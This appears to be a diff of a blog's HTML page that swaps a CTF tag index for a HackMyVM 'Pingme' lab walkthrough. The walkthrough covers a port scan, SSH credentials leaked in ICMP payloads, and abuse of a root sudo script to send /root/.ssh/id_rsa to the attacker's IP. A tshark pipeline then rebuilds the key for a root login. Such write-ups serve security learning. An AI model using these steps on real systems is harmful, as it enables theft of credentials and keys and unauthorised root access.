@@ -3,51 +3,101 @@
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">Ctf | My Blog</title>
-<meta property="og:title" content="Ctf | My Blog" />
-<meta name="twitter:title" content="Ctf | My Blog" />
-<meta itemprop="name" content="Ctf | My Blog" />
-<meta name="application-name" content="Ctf | My Blog" />
+<title itemprop="name">Pingme - Walkthrough | My Blog</title>
+<meta property="og:title" content="Pingme - Walkthrough | My Blog" />
+<meta name="twitter:title" content="Pingme - Walkthrough | My Blog" />
+<meta itemprop="name" content="Pingme - Walkthrough | My Blog" />
+<meta name="application-name" content="Pingme - Walkthrough | My Blog" />
 <meta property="og:site_name" content="My Blog" />
 
-<meta name="description" content="CTF writeups, hacking notes, and walkthroughs.">
-<meta itemprop="description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs." />
+<meta name="description" content="Walkthrough for the Pingme machine.">
+<meta itemprop="description" content="Walkthrough for the Pingme machine." />
+<meta property="og:description" content="Walkthrough for the Pingme machine." />
+<meta name="twitter:description" content="Walkthrough for the Pingme machine." />
 
 <meta property="og:locale" content="en-US" />
 <meta name="language" content="en-US" />
 
-  <link rel="alternate" hreflang="en" href="https://nvru.github.io/tags/ctf/" title="" />
+  <link rel="alternate" hreflang="en" href="https://nvru.github.io/posts/hmv/pingme/" title="" />
 
 
 
 
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2026-07-11T00:00:00Z />
+    <meta property="article:published_time" content=2026-07-11T00:00:00Z />
+    <meta property="og:url" content="https://nvru.github.io/posts/hmv/pingme/" />
+
+    
+    <meta property="og:article:author" content="null void root" />
+    <meta property="article:author" content="null void root" />
+    <meta name="author" content="null void root" />
+    
+    
+
+    
+
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Article",
+        "headline": "Pingme - Walkthrough",
+        "author": {
+        "@type": "Person",
+        "name": "null void root"
+        },
+        "datePublished": "2026-07-11",
+        "description": "Walkthrough for the Pingme machine.",
+        "wordCount":  590 ,
+        "mainEntityOfPage": "https://nvru.github.io/posts/hmv/pingme/",
+        "dateModified": "2026-07-11",
+        "image": {
+        "@type": "ImageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "My Blog"
+        }
+    }
+    </script>
 
 
 <meta name="generator" content="Hugo 0.164.0">
 
     
-    <meta property="og:url" content="https://nvru.github.io/tags/ctf/">
+    <meta property="og:url" content="https://nvru.github.io/posts/hmv/pingme/">
 	<meta property="og:site_name" content="My Blog">
-	<meta property="og:title" content="Ctf">
-	<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta property="og:title" content="Pingme - Walkthrough">
+	<meta property="og:description" content="Walkthrough for the Pingme machine.">
 	<meta property="og:locale" content="en_US">
-	<meta property="og:type" content="website">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-07-11T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-07-11T00:00:00+00:00">
+		<meta property="article:tag" content="Ctf">
+		<meta property="article:tag" content="Walkthrough">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Http">
+		<meta property="article:tag" content="Icmp">
+		<meta property="article:tag" content="Credential-Disclosure">
 
 
     
     
 	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Ctf">
-	<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta name="twitter:title" content="Pingme - Walkthrough">
+	<meta name="twitter:description" content="Walkthrough for the Pingme machine.">
 
 
     
 
-    <link rel="canonical" href="https://nvru.github.io/tags/ctf/">
-    <link href="/tags/ctf/index.xml" rel="alternate" type="application/rss+xml" title="My Blog">
-    <link href="/tags/ctf/index.xml" rel="feed" type="application/rss+xml" title="My Blog">
+    <link rel="canonical" href="https://nvru.github.io/posts/hmv/pingme/">
     <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -109,7 +159,7 @@ stroke-linejoin="round" class="feather feather-home">
                 </li>
                 
                 <li>
-                    <a class="menu-link " href="/posts/hmv/">
+                    <a class="menu-link active" href="/posts/hmv/">
                         HMV
                     </a>
                     
@@ -130,7 +180,7 @@ stroke-linejoin="round" class="feather feather-home">
                 </li>
                 
                 <li>
-                    <a class="menu-link " href="/posts/">
+                    <a class="menu-link active" href="/posts/">
                         Posts
                     </a>
                     
@@ -158,247 +208,158 @@ stroke-linejoin="round" class="feather feather-home">
         </div>
     </nav>
 </div>
-<div class="wrapper list-page">
-    <header class="header">
-        <h1 class="header-title center">Ctf</h1>
-    </header>
+
+<div class="wrapper post">
     <main class="page-content" aria-label="Content">
-        
-        
-        <h2 class="post-year">2026</h2>
-
-        
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/pingme/">Pingme - Walkthrough</a>
-    </h4>
+        <article>
+            <header class="header">
+                <h1 class="header-title">Pingme - Walkthrough</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-07-11T00:00:00&#43;00:00" itemprop="datePublished"> 11 Jul 2026 </time>
+                </div>
+                
+            </header>
+            
     
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-11T00:00:00Z">
-        11 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/immortal/">Immortal - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-10T00:00:00Z">
-        10 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/yuan113/">Yuan113 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-09T00:00:00Z">
-        9 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/yuan112/">Yuan112 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-09T00:00:00Z">
-        9 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/yuan111/">Yuan111 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-09T00:00:00Z">
-        9 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/yuan114/">Yuan114 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-08T00:00:00Z">
-        8 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/jabita/">Jabita - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-07T00:00:00Z">
-        7 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/translator/">Translator - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-06T00:00:00Z">
-        6 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/find/">Find - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-06T00:00:00Z">
-        6 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/helix/">Helix - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-05T00:00:00Z">
-        5 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/suidy/">The Suidy - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-04T00:00:00Z">
-        4 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/phantom/">Phantom - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-03T00:00:00Z">
-        3 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/darkside/">The DarkSide - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-01T00:00:00Z">
-        1 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/hmv/bonjur/">Bonjur - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-01T00:00:00Z">
-        1 Jul 2026
-    </time>
-</article>
-
-
-         
-
-         
-
-    </main>
-</div><footer class="footer">
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#port-scanning">Port Scanning</a>
+      <ul>
+        <li><a href="#rustscan">RustScan</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#web-enumeration">Web Enumeration</a></li>
+        <li><a href="#capturing-icmp-packets">Capturing ICMP Packets</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#pinger--root">pinger → root</a></li>
+      </ul>
+    </li>
+    <li><a href="#credentials">Credentials</a></li>
+    <li><a href="#flags">Flags</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h1 id="overview">Overview</h1>
+<ul>
+<li><strong>Attacker IP:</strong> <code>10.10.10.2</code></li>
+<li><strong>Target Machine IP:</strong> <code>10.10.10.21</code></li>
+</ul>
+<p>The objective was to enumerate the target, identify exposed services, gain initial access by recovering credentials leaked through ICMP packets, and escalate privileges by abusing a root-owned script that allowed arbitrary file transmission over ICMP.</p>
+<p><img src="/images/hmv/pingme/vm.png" alt="Machine information"></p>
+<hr>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="rustscan">RustScan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rustscan -a 10.10.10.21 -- -sC -sV -A -oA nmap/rust
+</span></span></code></pre></div><h4 id="results">Results</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux
+</span></span></code></pre></div><p>Only SSH and HTTP were exposed. Since SSH did not provide an entry point yet, I started with web enumeration.</p>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Browsing to port <strong>80</strong> revealed a very simple web page that immediately pinged my machine. There was no input field or any functionality to interact with; it simply displayed the ping output.</p>
+<p><img src="/images/hmv/pingme/http.png" alt="Ping page"></p>
+<p>The page source also didn&rsquo;t reveal anything useful, so I moved on to inspecting the network traffic.</p>
+<p>To verify what was happening, I captured the ICMP traffic on my machine using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tcpdump -ni any <span style="color:#e6db74">&#34;icmp[0] == 8&#34;</span>
+</span></span></code></pre></div><p>The web application was indeed sending ICMP Echo Requests to my machine.</p>
+<p>Since the application communicated through ICMP, I focused on inspecting the packet payload rather than the HTTP response.</p>
+<hr>
+<h3 id="capturing-icmp-packets">Capturing ICMP Packets</h3>
+<p>While inspecting the captured packets, I noticed that the ICMP payload contained more than just the standard ping data. The application was leaking information inside the packet payload.</p>
+<p>The first packets revealed the username:</p>
+<p><img src="/images/hmv/pingme/user_icmp.png" alt="ICMP username"></p>
+<p>Subsequent packets revealed the password:</p>
+<p><img src="/images/hmv/pingme/passwd_icmp.png" alt="ICMP password"></p>
+<p>Recovered credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Username: pinger
+</span></span><span style="display:flex;"><span>Password: P!ngM3
+</span></span></code></pre></div><p>Since SSH was the only other exposed service, I used the recovered credentials to authenticate successfully.</p>
+<hr>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="pinger--root">pinger → root</h3>
+<p>After logging in, I checked the home directory. Besides the user flag, nothing particularly interesting was present.</p>
+<p>The next step was checking sudo permissions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p><img src="/images/hmv/pingme/sudo_perm.png" alt="sudo permissions"></p>
+<p>The <code>pinger</code> user could execute:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/usr/local/sbin/sendfileping
+</span></span></code></pre></div><p>as <strong>root</strong> without supplying a password.</p>
+<p>I first checked whether the script itself was writable, but it wasn&rsquo;t.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l /usr/local/sbin/sendfileping
+</span></span></code></pre></div><p><img src="/images/hmv/pingme/src_perm.png" alt="Script permissions"></p>
+<p>Inspecting the file showed that it was a Bash script accepting two arguments:</p>
+<ul>
+<li>Destination IP</li>
+<li>File to transmit</li>
+</ul>
+<p>Since the script could read arbitrary files as root, I used it to send <code>/root/.ssh/id_rsa</code> to my machine. The file was transmitted through ICMP packets, which I captured and reconstructed.</p>
+<p>On my machine, I captured and reconstructed the transmitted packets using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tshark -i vboxnet0 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-f <span style="color:#e6db74">&#34;src 10.10.10.21 and icmp&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-c <span style="color:#ae81ff">2602</span> -x |
+</span></span><span style="display:flex;"><span>grep <span style="color:#e6db74">&#34;^0060&#34;</span> |
+</span></span><span style="display:flex;"><span>awk <span style="color:#e6db74">&#39;{print $NF}&#39;</span> |
+</span></span><span style="display:flex;"><span>cut -c2 |
+</span></span><span style="display:flex;"><span>xargs |
+</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#34;s/ //g&#34;</span> |
+</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#34;s/\./\n/g&#34;</span> |
+</span></span><span style="display:flex;"><span>tee root_rsa
+</span></span></code></pre></div><p>Command breakdown:</p>
+<ul>
+<li><code>-i vboxnet0</code> captures traffic on the VirtualBox Host-Only interface.</li>
+<li><code>-f</code> limits the capture to ICMP packets from the target.</li>
+<li><code>-c 2602</code> captures enough packets to reconstruct the transmitted file.</li>
+<li><code>-x</code> prints packet contents in hexadecimal and ASCII format.</li>
+<li><code>grep</code> and <code>awk</code> extract the relevant ASCII data from each packet.</li>
+<li><code>xargs</code> joins everything into one line.</li>
+<li>The first <code>sed</code> removes spaces.</li>
+<li>The second <code>sed</code> restores the original line structure by replacing <code>.</code> characters with newlines.</li>
+<li><code>tee</code> saves the recovered key.</li>
+</ul>
+<p>The reconstructed key looked like:</p>
+<p><img src="/images/hmv/pingme/root_rsa.png" alt="Recovered root key"></p>
+<p>The reconstructed key required one final manual adjustment. The header and footer appeared as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>-----BEGIN0OPENSSH0PRIVATE0KEY-----
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>-----END0OPENSSH0PRIVATE0KEY-----
+</span></span></code></pre></div><p>Replace the <code>0</code> characters with spaces:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>After fixing the key, I changed its permissions and authenticated as root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> root_rsa
+</span></span><span style="display:flex;"><span>ssh -i root_rsa root@10.10.10.21
+</span></span></code></pre></div><p><img src="/images/hmv/pingme/ssh_root.png" alt="Root shell"></p>
+<p>The same technique can also be used to retrieve the root flag directly. Instead of supplying <code>/root/.ssh/id_rsa</code>, <code>/root/root.txt</code> can be provided as the file argument and reconstructed from the captured ICMP traffic.</p>
+<p><img src="/images/hmv/pingme/root_flag.png" alt="Root flag extraction"></p>
+<hr>
+<h2 id="credentials">Credentials</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>pinger:P!ngM3
+</span></span></code></pre></div><hr>
+<h2 id="flags">Flags</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>user:HMV{ICMPisSafe}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:HMV{ICMPcanBeAbused}
+</span></span></code></pre></div>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
     <span class="footer_item"> </span>
     &nbsp;
 
